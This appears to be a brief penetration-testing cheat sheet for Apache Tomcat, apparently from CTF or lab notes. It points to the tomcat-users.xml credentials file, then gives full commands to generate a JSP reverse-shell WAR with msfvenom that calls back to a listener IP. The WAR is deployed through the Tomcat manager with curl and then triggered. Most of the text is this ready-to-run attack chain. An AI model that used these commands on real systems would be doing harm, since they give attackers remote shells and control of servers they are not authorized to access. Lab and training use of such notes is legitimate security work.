Tomcat

## Username and password

- Written in ```tomcat-users.xml```. This works for me : ```/usr/share/tomcat9/etc/tomcat-users.xml```, but if not, try to install it with the version needed, and then see where it's stored.


## Upload reverse shell

- The best part of tomcat server is that the host-manager gives you facility to create, delete, and manage virtual hosts within Tomcat remotely via curl command through command line if you have creds.

- Create Reverse Shell : ```msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.197 LPORT=1234 -f war > shell.war```

- Upload Reverse Shell : ```curl -u 'user':'pass' -T shell.war 'http://ip:port/manager/text/deploy?path=/my-shell'```

- List Deployed Shell : ```curl -u 'user':'pass' http://ip:port/manager/text/list```

- Start Netcat Listener

- Execute the deployed shell : ```curl -u 'user':'pass' http://ip:port/my-shell/```
